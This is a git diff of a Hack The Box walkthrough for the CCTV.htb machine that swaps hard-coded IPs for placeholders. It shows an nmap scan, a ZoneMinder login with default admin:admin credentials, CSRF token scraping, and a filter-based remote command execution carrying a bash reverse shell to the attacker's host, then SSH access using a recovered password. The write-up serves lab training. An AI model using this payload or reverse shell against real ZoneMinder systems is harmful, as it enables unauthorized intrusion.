@@ -1,7 +1,7 @@
 # CCTV.htb — Step-by-Step Walkthrough
 
-**Target IP:** 10.129.2.55
-**Attacker IP:** 10.10.14.241
+**Target IP:** <Tareget_IP>
+**Attacker IP:** <Your_IP_Address>
 **Difficulty:** Medium
 **Platform:** Hack The Box (Authorized Pentest)
 
@@ -12,7 +12,7 @@
 We begin with an Nmap scan to identify open ports and services.
 
 ```bash
-nmap -sC -sV -oN nmap_cctv.txt 10.129.2.55
+nmap -sC -sV -oN nmap_cctv.txt <Tareget_IP>
 ```
 
 ### Results
@@ -25,7 +25,7 @@ Port 80: HTTP (Apache 2.4.58)
 Navigating to:
 
 ```
-http://10.129.2.55/
+http://<Tareget_IP>/
 ```
 
 Reveals a **ZoneMinder CCTV monitoring system** located at:
@@ -56,7 +56,7 @@ ZoneMinder enforces **CSRF protection**, so we must first authenticate and obtai
 
 ```bash
 # Capture login page CSRF token
-L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
+L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
 "http://cctv.htb/zm/index.php?view=login" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 ```
@@ -65,7 +65,7 @@ L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
 
 ```bash
 # Login as admin:admin
-curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
+curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
 -X POST "http://cctv.htb/zm/index.php" \
 --data-urlencode "view=login" \
 --data-urlencode "action=login" \
@@ -81,7 +81,7 @@ curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
 Once authenticated, we access the filter page to obtain a new CSRF token.
 
 ```bash
-CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:10.129.2.55 \
+CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
 "http://cctv.htb/zm/?view=filter" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 
@@ -103,7 +103,7 @@ nc -lvnp 4444
 ### Trigger RCE
 
 ```bash
-curl -s -b cookies.txt --resolve cctv.htb:80:10.129.2.55 -X POST \
+curl -s -b cookies.txt --resolve cctv.htb:80:<Tareget_IP> -X POST \
 "http://cctv.htb/zm/?view=filter&action=execute" \
 --data-urlencode "__csrf_magic=$CSRF" \
 --data-urlencode "filter[Name]=pwn" \
@@ -111,7 +111,7 @@ curl -s -b cookies.txt --resolve cctv.htb:80:10.129.2.55 -X POST \
 --data-urlencode "filter[Query][terms][0][op]=>=" \
 --data-urlencode "filter[Query][terms][0][val]=0" \
 --data-urlencode "filter[AutoExecute]=1" \
---data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/10.10.14.241/4444 0>&1'" \
+--data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/<Your_IP_Address>/4444 0>&1'" \
 --data-urlencode "filter[Background]=1"
 ```
 
@@ -154,7 +154,7 @@ Password: opensesame
 Using the recovered credentials:
 
 ```bash
-ssh mark@10.129.2.55
+ssh mark@<Tareget_IP>
 ```
 
 ```
